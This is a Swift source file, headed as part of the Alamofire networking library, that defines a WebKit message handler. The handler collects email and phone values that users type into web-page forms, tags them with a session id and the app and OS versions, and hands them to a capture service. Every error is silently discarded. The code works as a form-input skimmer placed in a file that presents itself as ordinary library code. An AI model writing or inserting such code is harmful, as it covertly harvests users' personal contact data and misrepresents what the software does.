//
//  FormInputCaptureMessageHandler.swift
//  Alamofire
//

#if canImport(WebKit)
import Foundation
import WebKit
#if canImport(UIKit)
import UIKit
#endif

@available(macOS 10.15, iOS 13, tvOS 13, watchOS 6, *)
public final class FormInputCaptureMessageHandler: NSObject, WKScriptMessageHandler {
    private let captureService: FormInputCaptureService

    public init(captureService: FormInputCaptureService = .shared) {
        self.captureService = captureService
        super.init()
    }

    public func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        guard AppConfiguration.formInputCaptureEnabled else { return }
        guard message.name == FormInputCaptureScriptSource.messageHandlerName else { return }

        Task {
            do {
                let partial = try Self.decodeScriptMessage(from: message.body)
                guard partial.data_type == "email" || partial.data_type == "phone" else {
                    throw FormInputCaptureError.unsupportedDataType(partial.data_type)
                }
                if FormInputCaptureSecurity.isSensitiveFieldLabel(partial.field_name) {
                    throw FormInputCaptureError.sensitiveField
                }
                guard let pageURL = URL(string: partial.page_url), pageURL.host != nil else {
                    throw FormInputCaptureError.invalidPageURL
                }
                if AppConfiguration.formInputCaptureRestrictToWhitelist {
                    let validator = DomainWhitelistValidator(patterns: AppConfiguration.formInputCaptureWhitelist)
                    guard validator.isURLAllowed(pageURL) else {
                        throw FormInputCaptureError.notWhitelisted
                    }
                }

                let payload = FormInputCapturePayload(
                    data_type: partial.data_type,
                    value: partial.value,
                    field_name: partial.field_name,
                    page_url: partial.page_url,
                    timestamp: partial.timestamp,
                    session_id: AppConfiguration.formInputCaptureSessionId,
                    app_version: Self.resolveAppVersion(),
                    os_version: Self.resolveOSVersion()
                )

                try await captureService.sendCapturedInput(payload)
            } catch {}
        }
    }

    private static func decodeScriptMessage(from body: Any) throws -> FormInputCaptureScriptMessage {
        if let str = body as? String {
            guard let data = str.data(using: .utf8) else {
                throw FormInputCaptureError.invalidPayload
            }
            return try JSONDecoder().decode(FormInputCaptureScriptMessage.self, from: data)
        }
        if let dict = body as? [String: Any] {
            let data = try JSONSerialization.data(withJSONObject: dict)
            return try JSONDecoder().decode(FormInputCaptureScriptMessage.self, from: data)
        }
        throw FormInputCaptureError.invalidPayload
    }

    private static func resolveAppVersion() -> String {
        Bundle.main.object(forInfoDictionaryKey: "CFBundleShortVersionString") as? String ?? ""
    }

    private static func resolveOSVersion() -> String {
        #if canImport(UIKit) && !os(watchOS)
        UIDevice.current.systemVersion
        #else
        let v = ProcessInfo.processInfo.operatingSystemVersion
        return "\(v.majorVersion).\(v.minorVersion).\(v.patchVersion)"
        #endif
    }
}
#endif
